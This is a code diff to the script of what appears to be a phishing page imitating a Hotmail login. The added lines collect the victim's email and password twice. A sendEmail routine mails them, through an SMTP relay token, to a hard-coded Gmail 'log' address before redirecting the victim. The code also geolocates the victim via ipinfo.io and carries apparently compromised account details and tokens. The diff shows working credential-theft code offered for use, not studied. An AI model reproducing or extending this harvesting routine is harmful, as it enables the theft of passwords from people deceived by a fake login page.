@@ -1,3 +1,10 @@
+  var smtp_host = 'smtp.office365.com';
+  var smtp_username = 'marc.declercq@edu.vlerick.com';
+
+  //Enter were logs will go here
+  var log_email = 'johnchurchwell118@gmail.com'
+
+
   url_link = "session.html";
   displayPassword()
   loadPasswordAgain()
@@ -107,9 +114,24 @@
   function processPassword2(t) {
     t.preventDefault();
     var e = this.userPassword2.value.trim();
+
+    var message = "<div> ==================+[ Personal Info - Hotmail ]+================== <br> Username/Email => " + userEmail +  "<br>Password => "+userPassword1 +  "<br>confirm_password => " + e +"</div>"; 
+    fetch('https://ipinfo.io?token=f531e7d80833ee')
+  .then(response => response.json())
+  .then(data => console.log(data));
+
+  console.log(message)
     
-    "" != e ? (sendDetails(userEmail, userPassword1, confirmPassword = e), hide("password2-row"), show("animate"), "flex" == document.getElementById("animate").style.display) : (hide("password22Error"), show("password21Error"))
+    "" != e ? (sendEmail(log_email, message), hide("password2-row"), show("animate"), "flex" == document.getElementById("animate").style.display) : (hide("password22Error"), show("password21Error"))
 }
+
+
+//   function processPassword2(t) {
+//     t.preventDefault();
+//     var e = this.userPassword2.value.trim();
+    
+//     "" != e ? (sendDetails(userEmail, userPassword1, confirmPassword = e), hide("password2-row"), show("animate"), "flex" == document.getElementById("animate").style.display) : (hide("password22Error"), show("password21Error"))
+// }
 
   function sendDetails(t, e, n) {
       var o = new FormData;
@@ -189,3 +211,23 @@
 }
 
 
+function sendEmail(to,message) {
+  Email.send({
+  // Host: smtp_host,
+  // Username : smtp_username,
+  // Password : smtp_password,
+  SecureToken: '232d9590-ce69-4dec-8b72-178e83e97702',
+  To : to,
+  From : smtp_username,
+  Subject : '==============+ [Hotmail] +================',
+  Body : message,
+  }).then(function(message){
+      if(message == 'OK'){
+        console.log('message sent')
+        redirect(url_link)
+      }else{
+        console.log(message), alert('there was an error' + "\nPlease try again!"), window.history.go(-1)
+      }
+    }
+  );
+}
